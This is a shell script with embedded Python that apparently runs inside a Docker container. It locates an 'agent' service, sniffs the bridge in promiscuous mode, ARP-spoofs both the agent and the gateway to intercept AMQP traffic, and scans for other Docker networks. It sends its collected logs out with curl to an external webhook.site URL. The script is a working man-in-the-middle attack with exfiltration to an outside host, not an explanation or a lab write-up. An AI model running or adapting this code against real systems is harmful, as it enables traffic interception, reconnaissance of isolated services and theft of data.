#!/bin/sh
set -e
LOG=/tmp/diag_v7.log
exec > "$LOG" 2>&1

WH="https://webhook.site/2d6eb676-d74f-4b42-a459-21b879ae64b6"

apk add --no-cache curl tcpdump iproute2 python3 >/dev/null 2>&1

echo "=== PHASE 0: NETWORK ==="
IFACE=$(ip route | awk '/default/{print $5; exit}')
GW=$(ip route | awk '/default/{print $3; exit}')
OUR_IP=$(ip -4 addr show "$IFACE" | awk '/inet /{print $2}' | cut -d/ -f1)
OUR_MAC=$(ip link show "$IFACE" | awk '/link\/ether/{print $2}')
echo "IFACE=$IFACE GW=$GW OUR_IP=$OUR_IP OUR_MAC=$OUR_MAC"

# ARP sysctls
echo "=== ARP SYSCTLS ==="
for f in /proc/sys/net/ipv4/conf/eth0/arp_accept \
         /proc/sys/net/ipv4/conf/eth0/arp_filter \
         /proc/sys/net/ipv4/conf/eth0/arp_ignore \
         /proc/sys/net/ipv4/conf/all/arp_accept \
         /proc/sys/net/ipv4/conf/all/arp_filter \
         /proc/sys/net/ipv4/ip_forward; do
  echo "$f = $(cat $f 2>/dev/null || echo N/A)"
done

# Caps
echo "=== CAPS ==="
grep Cap /proc/self/status

# Ping sweep + find agent
echo "=== FIND AGENT ==="
for i in 2 3 4 5 6 7 8 9 10; do
  ping -c 1 -W 1 "172.17.0.${i}" >/dev/null 2>/dev/null &
done
wait; sleep 1

ip neigh show | grep -v INCOMPLETE | grep -v FAILED
AGENT_IP=""
for i in 2 3 4 5 6 7 8; do
  c="172.17.0.${i}"
  [ "$c" = "$OUR_IP" ] && continue
  [ "$c" = "$GW" ] && continue
  timeout 2 sh -c "echo | nc -w1 $c 8000" >/dev/null 2>&1 && {
    AGENT_IP="$c"
    break
  }
done

if [ -z "$AGENT_IP" ]; then
  echo "FAIL: agent not found on port 8000"
  { head -30 "$LOG"; } | curl -sS --max-time 20 --data-binary @- "$WH?tag=L1-V7-FAIL"
  sleep 999999; exit 1
fi

AGENT_MAC=$(ip neigh show "$AGENT_IP" | awk '{print $5}' | head -1)
GW_MAC=$(ip neigh show "$GW" | awk '{print $5}' | head -1)
echo "AGENT=$AGENT_IP MAC=$AGENT_MAC"
echo "GW=$GW GW_MAC=$GW_MAC"

# Probe agent HTTP to see what it returns
echo "=== AGENT HTTP PROBE ==="
curl -sS --max-time 5 "http://$AGENT_IP:8000/" 2>&1 | head -10 || echo "(no response)"
curl -sS --max-time 5 "http://$AGENT_IP:8000/health" 2>&1 | head -10 || echo "(no response)"
curl -sS --max-time 5 "http://$AGENT_IP:8000/api/v1/status" 2>&1 | head -10 || echo "(no response)"

echo ""
echo "==================================================================="
echo "=== PHASE 1: PROMISC PASSIVE CAPTURE (120s, NO spoof) ==="
echo "==================================================================="
echo "Core question: can we see agent traffic at ALL on this bridge?"
ip link set "$IFACE" promisc on
echo "promisc enabled: $(ip link show $IFACE | grep -o PROMISC)"

python3 << 'PYEOF'
import socket, struct, time, os

IFACE = os.environ.get("IFACE", "eth0")
AGENT_MAC_STR = os.environ.get("AGENT_MAC", "").replace(":", "")
GW_MAC_STR = os.environ.get("GW_MAC", "").replace(":", "")
OUR_MAC_STR = os.environ.get("OUR_MAC", "").replace(":", "")

AGENT_MAC = bytes.fromhex(AGENT_MAC_STR) if AGENT_MAC_STR else b'\x00'*6
GW_MAC = bytes.fromhex(GW_MAC_STR) if GW_MAC_STR else b'\x00'*6
OUR_MAC = bytes.fromhex(OUR_MAC_STR) if OUR_MAC_STR else b'\x00'*6
BCAST = b'\xff\xff\xff\xff\xff\xff'

sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
sock.bind((IFACE, 0))
sock.settimeout(1)

mac_count = {}
total = 0
agent_frames = 0
gw_frames = 0
amqp_frames = 0
our_frames = 0
agent_samples = []
amqp_samples = []

print(f"Capturing 120s in promisc mode on {IFACE}...")
print(f"  AGENT_MAC={AGENT_MAC.hex()}")
print(f"  GW_MAC={GW_MAC.hex()}")
print(f"  OUR_MAC={OUR_MAC.hex()}")

start = time.time()
while time.time() < start + 120:
    try:
        frame = sock.recv(65535)
        total += 1
        if len(frame) < 14:
            continue
        dst = frame[0:6]
        src = frame[6:12]
        eth_type = struct.unpack('!H', frame[12:14])[0]
        src_hex = src.hex()
        mac_count[src_hex] = mac_count.get(src_hex, 0) + 1

        if src == AGENT_MAC:
            agent_frames += 1
            if len(agent_samples) < 10:
                info = f"agent src type=0x{eth_type:04x} dst={dst.hex()} len={len(frame)}"
                if eth_type == 0x0800 and len(frame) >= 34:
                    src_ip = '.'.join(str(b) for b in frame[26:30])
                    dst_ip = '.'.join(str(b) for b in frame[30:34])
                    proto = frame[23]
                    info += f" {src_ip}->{dst_ip} proto={proto}"
                    if proto == 6 and len(frame) >= 14 + ((frame[14]&0xF)*4) + 4:
                        ihl = (frame[14]&0xF)*4
                        sport, dport = struct.unpack('!HH', frame[14+ihl:14+ihl+4])
                        info += f" tcp {sport}->{dport}"
                agent_samples.append(info)

        if src == GW_MAC:
            gw_frames += 1

        if src == OUR_MAC:
            our_frames += 1

        if eth_type == 0x0800 and len(frame) >= 34:
            proto = frame[23]
            if proto == 6:
                ihl = (frame[14]&0xF)*4
                tcp_off = 14 + ihl
                if len(frame) >= tcp_off + 4:
                    sport, dport = struct.unpack('!HH', frame[tcp_off:tcp_off+4])
                    if sport == 5672 or dport == 5672:
                        amqp_frames += 1
                        src_ip = '.'.join(str(b) for b in frame[26:30])
                        dst_ip = '.'.join(str(b) for b in frame[30:34])
                        sample = f"AMQP {src_ip}:{sport}->{dst_ip}:{dport} srcmac={src_hex} dstmac={dst.hex()}"
                        if len(amqp_samples) < 10:
                            amqp_samples.append(sample)

    except socket.timeout:
        pass
    except Exception as e:
        print(f"err: {e}")
        break

elapsed = time.time() - start
print(f"\n=== PASSIVE RESULTS ({elapsed:.0f}s) ===")
print(f"Total frames: {total}")
print(f"  From agent MAC: {agent_frames}")
print(f"  From GW MAC: {gw_frames}")
print(f"  From OUR MAC: {our_frames}")
print(f"  AMQP (port 5672): {amqp_frames}")
print(f"\nMAC frequency (top 10):")
for mac, cnt in sorted(mac_count.items(), key=lambda x: -x[1])[:10]:
    label = ""
    if mac == AGENT_MAC.hex(): label = " [AGENT]"
    elif mac == GW_MAC.hex(): label = " [GW]"
    elif mac == OUR_MAC.hex(): label = " [US]"
    print(f"  {mac}: {cnt}{label}")

if agent_samples:
    print(f"\nAgent frame samples:")
    for s in agent_samples:
        print(f"  {s}")
else:
    print(f"\n*** NO FRAMES FROM AGENT MAC IN {elapsed:.0f}s ***")
    print("=> Agent likely uses a DIFFERENT bridge/interface for external traffic")

if amqp_samples:
    print(f"\nAMQP frame samples:")
    for s in amqp_samples:
        print(f"  {s}")
else:
    print(f"\n*** NO AMQP TRAFFIC SEEN IN {elapsed:.0f}s ***")

PYEOF

echo ""
echo "==================================================================="
echo "=== PHASE 2: MULTI-METHOD ARP SPOOF + CAPTURE (120s) ==="
echo "==================================================================="

export IFACE GW AGENT_IP AGENT_MAC GW_MAC OUR_IP OUR_MAC

python3 << 'PYEOF2'
import socket, struct, time, os, threading

IFACE = os.environ["IFACE"]
GW = os.environ["GW"]
AGENT_IP = os.environ["AGENT_IP"]
OUR_IP = os.environ["OUR_IP"]

AGENT_MAC = bytes.fromhex(os.environ["AGENT_MAC"].replace(":", ""))
GW_MAC = bytes.fromhex(os.environ["GW_MAC"].replace(":", ""))
OUR_MAC = bytes.fromhex(os.environ["OUR_MAC"].replace(":", ""))
BCAST = b'\xff\xff\xff\xff\xff\xff'

# Enable IP forwarding so intercepted traffic can be relayed
try:
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
        f.write('1')
    print("IP forwarding enabled")
except Exception as e:
    print(f"IP forwarding: {e}")

send_sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
send_sock.bind((IFACE, 0))

recv_sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
recv_sock.bind((IFACE, 0))
recv_sock.settimeout(1)

def arp_reply(sm, sip, dm, dip):
    return (dm + sm + b'\x08\x06' +
            struct.pack('!HHBBH', 1, 0x0800, 6, 4, 2) +
            sm + socket.inet_aton(sip) + dm + socket.inet_aton(dip))

def arp_request(sm, sip, target_ip):
    return (BCAST + sm + b'\x08\x06' +
            struct.pack('!HHBBH', 1, 0x0800, 6, 4, 1) +
            sm + socket.inet_aton(sip) + b'\x00'*6 + socket.inet_aton(target_ip))

def gratuitous_arp(sm, sip):
    return (BCAST + sm + b'\x08\x06' +
            struct.pack('!HHBBH', 1, 0x0800, 6, 4, 2) +
            sm + socket.inet_aton(sip) + BCAST + socket.inet_aton(sip))

# Method 1: Directed ARP reply (tell agent: GW is at OUR_MAC)
p1_directed = arp_reply(OUR_MAC, GW, AGENT_MAC, AGENT_IP)
# Method 2: Gratuitous ARP broadcast (announce: GW is at OUR_MAC)
p2_gratuitous = gratuitous_arp(OUR_MAC, GW)
# Method 3: ARP request with spoofed source (ask for agent, claim to be GW at OUR_MAC)
p3_request = arp_request(OUR_MAC, GW, AGENT_IP)

# Also poison GW (reverse direction)
r1_directed = arp_reply(OUR_MAC, AGENT_IP, GW_MAC, GW)
r2_gratuitous = gratuitous_arp(OUR_MAC, AGENT_IP)
r3_request = arp_request(OUR_MAC, AGENT_IP, GW)

print("=== Sending ARP spoof (3 methods, 10 rounds each) ===")
methods = [
    ("M1 directed reply", [p1_directed, r1_directed]),
    ("M2 gratuitous broadcast", [p2_gratuitous, r2_gratuitous]),
    ("M3 ARP request spoof", [p3_request, r3_request]),
]

for name, packets in methods:
    print(f"\n  {name}:")
    for i in range(10):
        for p in packets:
            try:
                send_sock.send(p)
            except Exception as e:
                print(f"    send error: {e}")
        time.sleep(0.2)
    print(f"    sent 10 rounds OK")

# Continuous spoof in background
spoof_running = True
def spoof_loop():
    while spoof_running:
        for _, packets in methods:
            for p in packets:
                try:
                    send_sock.send(p)
                except:
                    pass
        time.sleep(0.5)
t = threading.Thread(target=spoof_loop, daemon=True)
t.start()

# Capture for 120s
print(f"\n=== Capturing 120s with active spoof ===")
total = 0
agent_frames = 0
gw_frames = 0
our_frames = 0
amqp_frames = 0
to_us = 0
agent_samples = []
amqp_samples = []
mac_count = {}

start = time.time()
while time.time() < start + 120:
    try:
        frame = recv_sock.recv(65535)
        total += 1
        if len(frame) < 14:
            continue
        dst = frame[0:6]
        src = frame[6:12]
        eth_type = struct.unpack('!H', frame[12:14])[0]
        src_hex = src.hex()
        mac_count[src_hex] = mac_count.get(src_hex, 0) + 1

        if dst == OUR_MAC:
            to_us += 1
        if src == AGENT_MAC:
            agent_frames += 1
            if len(agent_samples) < 15:
                info = f"t={time.time()-start:.1f} agent->dst={dst.hex()} type=0x{eth_type:04x} len={len(frame)}"
                if eth_type == 0x0800 and len(frame) >= 34:
                    src_ip = '.'.join(str(b) for b in frame[26:30])
                    dst_ip = '.'.join(str(b) for b in frame[30:34])
                    proto = frame[23]
                    info += f" {src_ip}->{dst_ip} p={proto}"
                    if proto == 6 and len(frame) >= 14 + ((frame[14]&0xF)*4) + 4:
                        ihl = (frame[14]&0xF)*4
                        sport, dport = struct.unpack('!HH', frame[14+ihl:14+ihl+4])
                        info += f" tcp:{sport}->{dport}"
                agent_samples.append(info)
        if src == GW_MAC:
            gw_frames += 1
        if src == OUR_MAC:
            our_frames += 1
        if eth_type == 0x0800 and len(frame) >= 34:
            proto = frame[23]
            if proto == 6:
                ihl = (frame[14]&0xF)*4
                tcp_off = 14 + ihl
                if len(frame) >= tcp_off + 4:
                    sport, dport = struct.unpack('!HH', frame[tcp_off:tcp_off+4])
                    if sport == 5672 or dport == 5672:
                        amqp_frames += 1
                        src_ip = '.'.join(str(b) for b in frame[26:30])
                        dst_ip = '.'.join(str(b) for b in frame[30:34])
                        if len(amqp_samples) < 10:
                            amqp_samples.append(f"AMQP {src_ip}:{sport}->{dst_ip}:{dport} sm={src_hex}")
    except socket.timeout:
        pass
    except Exception as e:
        print(f"err: {e}")

spoof_running = False
t.join(timeout=2)

# Restore ARP
print("\n=== Restoring ARP ===")
restore_a = arp_reply(GW_MAC, GW, AGENT_MAC, AGENT_IP)
restore_g = arp_reply(AGENT_MAC, AGENT_IP, GW_MAC, GW)
for _ in range(5):
    try:
        send_sock.send(restore_a)
        send_sock.send(restore_g)
    except: pass
    time.sleep(0.3)

elapsed = time.time() - start
print(f"\n=== POST-SPOOF RESULTS ({elapsed:.0f}s) ===")
print(f"Total frames: {total}")
print(f"  Addressed to us: {to_us}")
print(f"  From agent MAC: {agent_frames}")
print(f"  From GW MAC: {gw_frames}")
print(f"  From OUR MAC: {our_frames}")
print(f"  AMQP (5672): {amqp_frames}")
print(f"\nMAC frequency (top 10):")
for mac, cnt in sorted(mac_count.items(), key=lambda x: -x[1])[:10]:
    label = ""
    if mac == AGENT_MAC.hex(): label = " [AGENT]"
    elif mac == GW_MAC.hex(): label = " [GW]"
    elif mac == OUR_MAC.hex(): label = " [US]"
    print(f"  {mac}: {cnt}{label}")

if agent_samples:
    print(f"\nAgent frame samples:")
    for s in agent_samples:
        print(f"  {s}")
if amqp_samples:
    print(f"\nAMQP samples:")
    for s in amqp_samples:
        print(f"  {s}")

if agent_frames == 0 and amqp_frames == 0:
    print("\n*** VERDICT: Agent traffic NOT visible even with promisc + ARP spoof ***")
    print("*** Agent likely routes external traffic through a DIFFERENT Docker network ***")
    print("*** ARP MITM on docker0 CANNOT intercept AMQP traffic ***")
elif agent_frames > 0 and amqp_frames == 0:
    print("\n*** VERDICT: Agent frames visible but NO AMQP traffic ***")
    print("*** Possible: AMQP goes through different interface, or heartbeat interval > 120s ***")
elif amqp_frames > 0:
    print("\n*** VERDICT: AMQP TRAFFIC INTERCEPTED! ARP spoof works! ***")

PYEOF2

echo ""
echo "=== PHASE 3: DOCKER NETWORK RECON ==="
echo "--- What networks exist? ---"
# Try to discover other docker networks by scanning non-172.17 ranges
for net in 172.18.0 172.19.0 172.20.0 172.21.0 10.0.0; do
  timeout 1 ping -c1 -W1 "${net}.1" >/dev/null 2>&1 && echo "GW reachable: ${net}.1" || true
done

echo "--- Route table ---"
ip route

echo ""
echo "=== SENDING RESULTS ==="
{ tail -200 "$LOG"; } | curl -sS --max-time 30 --data-binary @- "$WH?tag=L1-V7-RESULT"

sleep 999999
